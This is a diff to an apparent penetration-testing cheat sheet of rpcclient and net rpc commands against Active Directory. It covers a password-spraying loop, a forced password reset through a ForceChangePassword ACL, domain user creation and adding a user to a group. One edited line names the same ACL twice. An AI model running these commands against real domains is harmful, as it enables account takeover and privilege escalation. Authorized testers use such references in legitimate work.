@@ -59,7 +59,7 @@ querydominfo                    # also includes basic policy summary
 
 ## Password Spraying
 
-Manual spray when nxc is unavailable:
+Manual spray when `netexec` is unavailable:
 
 ```bash
 for u in $(cat <USERS>); do rpcclient -U "$u%<PASSWORD>" -c "getusername;quit" <TARGET> | grep Authority; done
@@ -69,23 +69,33 @@ for u in $(cat <USERS>); do rpcclient -U "$u%<PASSWORD>" -c "getusername;quit" <
 
 ### Force Change Password
 
-Requires `ForceChangePassword` ACE on the target user or Domain Admin rights:
+Requires `ForceChangePassword` or `ForceChangePassword` ACL on the target user or Domain Admin rights:
 
 ```bash
-rpcclient -U '<DOMAIN>/<USER>%<PASSWORD>' <DC_IP> -c "setuserinfo2 <USER_TO_CHANGE> 23 '<NEW_PASSWORD>'"
+rpcclient -U '<DOMAIN>/<USER>%<PASSWORD>' <DC_IP> -c 'setuserinfo2 <USER_TO_CHANGE> 23 <NEW_PASSWORD>'
+```
+
+### Change Password
+
+Must know old password
+
+```bash
+rpcclient -U '<USER>%<PASSWORD>' <TARGET> -c "chgpasswd3 <USERNAME> '<OLDPASS>' '<NEWPASS>'"
 ```
 
 ### Create User
+
+Create new user and set its password
 
 ```bash
 rpcclient -U '<USER>%<PASSWORD>' <TARGET> -c "createdomuser <USERNAME>"
 rpcclient -U '<USER>%<PASSWORD>' <TARGET> -c "setuserinfo2 <USERNAME> 24 '<PASSWORD>'"
 ```
 
-### Change Password
+### Add User to Group
 
 ```bash
-rpcclient -U '<USER>%<PASSWORD>' <TARGET> -c "chgpasswd3 <USERNAME> '<OLDPASS>' '<NEWPASS>'"
+net rpc group addmem "<TO_GROUP>" "<USER_TO_ADD>" -U "<DOMAIN>/<USER>%<PASSWORD>" -S <DC>
 ```
 
 ### Create Share
